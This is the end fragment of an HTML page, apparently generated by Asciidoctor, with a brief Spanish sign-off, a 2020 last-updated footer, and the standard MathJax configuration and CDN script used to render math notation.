<p>Muchas gracias. - <em>Cache Utily Mainframe</em></p>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Last updated 2020-08-30 10:49:56 -0500
</div>
</div>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  messageStyle: "none",
  tex2jax: {
    inlineMath: [["\\(", "\\)"]],
    displayMath: [["\\[", "\\]"]],
    ignoreClass: "nostem|nolatexmath"
  },
  asciimath2jax: {
    delimiters: [["\\$", "\\$"]],
    ignoreClass: "nostem|noasciimath"
  },
  TeX: { equationNumbers: { autoNumber: "none" } }
})
MathJax.Hub.Register.StartupHook("AsciiMath Jax Ready", function () {
  MathJax.InputJax.AsciiMath.postfilterHooks.Add(function (data, node) {
    if ((node = data.script.parentNode) && (node = node.parentNode) && node.classList.contains('stemblock')) {
      data.math.root.display = "block"
    }
    return data
  })
})
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_HTMLorMML"></script>
</body>
</html>